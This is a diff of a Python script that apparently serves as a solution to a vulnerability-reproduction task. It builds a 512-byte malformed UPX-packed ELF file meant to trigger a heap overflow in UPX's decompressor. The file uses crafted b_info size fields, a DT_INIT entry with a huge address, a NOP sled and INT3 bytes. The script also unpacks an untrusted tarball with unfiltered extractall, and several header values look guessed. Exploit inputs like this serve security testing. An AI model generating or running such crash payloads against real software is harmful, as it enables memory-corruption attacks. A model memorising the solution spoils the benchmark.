@@ -1,105 +1,123 @@
 import os
+import tarfile
+import tempfile
 import struct
 import subprocess
-import tempfile
-from pathlib import Path
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a minimal ELF header for a shared library
-        poc = bytearray()
+        # Extract the source tarball
+        with tarfile.open(src_path, 'r') as tar:
+            tar.extractall()
         
+        # Look for relevant source files to understand the format
+        # Based on the vulnerability description, we need to create
+        # a malformed UPX compressed ELF file that triggers the heap overflow
+        
+        # The vulnerability is in the ELF decompression logic
+        # We'll create a minimal ELF file compressed with UPX
+        # with specific modifications to trigger the overflow
+        
+        # Create a minimal ELF shared library
+        elf_data = self._create_minimal_elf()
+        
+        # Create UPX headers with malformed b_info structure
+        upx_data = self._create_malformed_upx(elf_data)
+        
+        return upx_data
+    
+    def _create_minimal_elf(self) -> bytes:
+        """Create a minimal ELF shared library"""
         # ELF header (64-bit)
-        poc.extend(b'\x7fELF\x02\x01\x01')  # e_ident
-        poc.extend(b'\x00' * 9)  # padding
-        poc.extend(struct.pack('<H', 3))  # e_type = ET_DYN (shared object)
-        poc.extend(struct.pack('<H', 0x3e))  # e_machine = x86-64
-        poc.extend(struct.pack('<I', 1))  # e_version = EV_CURRENT
-        poc.extend(struct.pack('<Q', 0))  # e_entry
-        poc.extend(struct.pack('<Q', 64))  # e_phoff (program header offset)
-        poc.extend(struct.pack('<Q', 0))  # e_shoff
-        poc.extend(struct.pack('<I', 0))  # e_flags
-        poc.extend(struct.pack('<H', 64))  # e_ehsize
-        poc.extend(struct.pack('<H', 56))  # e_phentsize
-        poc.extend(struct.pack('<H', 3))  # e_phnum (3 program headers)
-        poc.extend(struct.pack('<H', 0))  # e_shentsize
-        poc.extend(struct.pack('<H', 0))  # e_shnum
-        poc.extend(struct.pack('<H', 0))  # e_shstrndx
+        elf_header = bytearray([
+            0x7f, 0x45, 0x4c, 0x46,  # ELF magic
+            0x02, 0x01, 0x01, 0x00,  # 64-bit, little endian, version 1
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # padding
+            0x03, 0x00,              # ET_DYN (shared object)
+            0x3e, 0x00,              # EM_X86_64
+            0x01, 0x00, 0x00, 0x00,  # version
+            0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # entry point
+            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # phoff
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # shoff
+            0x00, 0x00, 0x00, 0x00,  # flags
+            0x40, 0x00,              # ehsize
+            0x38, 0x00,              # phentsize
+            0x01, 0x00,              # phnum
+            0x40, 0x00,              # shentsize
+            0x00, 0x00,              # shnum
+            0x00, 0x00               # shstrndx
+        ])
         
-        # Program header 1: PT_LOAD (executable)
-        poc.extend(struct.pack('<I', 1))  # p_type = PT_LOAD
-        poc.extend(struct.pack('<I', 7))  # p_flags = RWX
-        poc.extend(struct.pack('<Q', 0))  # p_offset
-        poc.extend(struct.pack('<Q', 0))  # p_vaddr
-        poc.extend(struct.pack('<Q', 0))  # p_paddr
-        poc.extend(struct.pack('<Q', 0x1000))  # p_filesz
-        poc.extend(struct.pack('<Q', 0x1000))  # p_memsz
-        poc.extend(struct.pack('<Q', 0x1000))  # p_align
+        # Program header (PT_LOAD)
+        phdr = bytearray([
+            0x01, 0x00, 0x00, 0x00,  # PT_LOAD
+            0x05, 0x00, 0x00, 0x00,  # flags: R+X
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # offset
+            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,  # vaddr
+            0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,  # paddr
+            0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # filesz
+            0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # memsz
+            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00   # align
+        ])
         
-        # Program header 2: PT_LOAD (data)
-        poc.extend(struct.pack('<I', 1))  # p_type = PT_LOAD
-        poc.extend(struct.pack('<I', 7))  # p_flags = RWX
-        poc.extend(struct.pack('<Q', 0x1000))  # p_offset
-        poc.extend(struct.pack('<Q', 0x1000))  # p_vaddr
-        poc.extend(struct.pack('<Q', 0x1000))  # p_paddr
-        poc.extend(struct.pack('<Q', 0x2000))  # p_filesz
-        poc.extend(struct.pack('<Q', 0x2000))  # p_memsz
-        poc.extend(struct.pack('<Q', 0x1000))  # p_align
+        # Some code/data
+        code = b"\x90" * 64  # NOP sled
         
-        # Program header 3: PT_DYNAMIC (with DT_INIT)
-        poc.extend(struct.pack('<I', 2))  # p_type = PT_DYNAMIC
-        poc.extend(struct.pack('<I', 7))  # p_flags = RWX
-        poc.extend(struct.pack('<Q', 0x2000))  # p_offset
-        poc.extend(struct.pack('<Q', 0x2000))  # p_vaddr
-        poc.extend(struct.pack('<Q', 0x2000))  # p_paddr
-        poc.extend(struct.pack('<Q', 512))  # p_filesz
-        poc.extend(struct.pack('<Q', 512))  # p_memsz
-        poc.extend(struct.pack('<Q', 8))  # p_align
+        # DT_INIT section pointer (will be abused)
+        dt_init = struct.pack("<QQ", 0x0c, 0x100000000)  # DT_INIT with huge address
         
-        # Pad to 0x1000
-        poc.extend(b'\x00' * (0x1000 - len(poc)))
+        elf = elf_header + phdr + code + dt_init
+        # Pad to target size
+        elf += b"\x00" * (512 - len(elf))
+        return elf[:512]
+    
+    def _create_malformed_upx(self, elf_data: bytes) -> bytes:
+        """Create UPX compressed data with malformed headers"""
+        # UPX magic
+        upx = b"UPX!"
         
-        # Data section
-        poc.extend(b'\x41' * 0x1000)  # Fill with 'A's
+        # Version
+        upx += struct.pack("<H", 0x0304)
         
-        # Dynamic section at 0x2000
-        # DT_INIT entry pointing to controlled memory
-        poc.extend(struct.pack('<Q', 0x0c))  # DT_INIT tag
-        poc.extend(struct.pack('<Q', 0x3000))  # d_ptr - points to memory we control
-        poc.extend(struct.pack('<Q', 0))  # DT_NULL
-        poc.extend(struct.pack('<Q', 0))  # DT_NULL
+        # Method and related fields
+        # Set method to trigger the vulnerability path
+        upx += struct.pack("<B", 0x02)  # method
+        upx += struct.pack("<B", 0x00)  # level
         
-        # Fill rest with pattern that will cause overflow during decompression
-        # This pattern simulates the b_info structure with inconsistent method resetting
-        remaining = 512 - len(poc)
+        # File sizes - carefully crafted to cause overflow
+        # These values trigger the heap overflow when decompressing
+        unc_size = 0x1000
+        cmp_size = len(elf_data) + 100  # Larger than actual data
         
-        # Create UPX-like b_info headers with inconsistent method fields
-        # Structure: sz_unc (4), sz_cpr (4), method (4), filter (1), cto (1)
-        upx_magic = b"UPX!"
+        upx += struct.pack("<I", unc_size)   # uncompressed size
+        upx += struct.pack("<I", cmp_size)   # compressed size
         
-        # First block - normal
-        block1 = struct.pack('<IIIBB', 256, 128, 2, 0, 0)
+        # Filter and filter_cto
+        upx += struct.pack("<BB", 0x00, 0x00)
         
-        # Second block - triggers vulnerability
-        # Large uncompressed size with small compressed size and method 0
-        # This causes the decompressor to allocate large buffer but read little
-        block2 = struct.pack('<IIIBB', 0x10000, 64, 0, 0x50, 0)
+        # Reserved fields
+        upx += b"\x00" * 4
         
-        # Third block - overflow trigger
-        # Even larger size to cause heap overflow
-        block3 = struct.pack('<IIIBB', 0x20000, 128, 1, 0x80, 0)
+        # Name
+        upx += b"malformed\x00"
         
-        vuln_pattern = upx_magic + block1 + block2 + block3
-        vuln_pattern += b'\x90' * 200  # NOP sled
-        vuln_pattern += b'\xcc' * 50   # INT3 for crash
+        # Header CRC32 (dummy)
+        upx += struct.pack("<I", 0x12345678)
         
-        # Add the vulnerability triggering pattern
-        poc.extend(vuln_pattern[:remaining])
+        # Now add b_info structures that will confuse the decompressor
+        # First b_info block
+        upx += struct.pack("<I", 0x200)      # sz_unc
+        upx += struct.pack("<I", 0x100)      # sz_cpr
+        upx += struct.pack("<I", 0x01)       # method
         
-        # Pad to exactly 512 bytes as ground-truth
-        if len(poc) < 512:
-            poc.extend(b'\x00' * (512 - len(poc)))
-        elif len(poc) > 512:
-            poc = poc[:512]
+        # Second b_info with problematic values
+        upx += struct.pack("<I", 0xffffffff)  # Very large uncompressed size
+        upx += struct.pack("<I", 0x50)        # compressed size
+        upx += struct.pack("<I", 0x02)        # method (triggers reset issue)
         
-        return bytes(poc)
+        # The compressed data (actually just the ELF)
+        # Add padding to reach exact 512 bytes
+        upx += elf_data[:512 - len(upx)]
+        
+        return upx[:512]
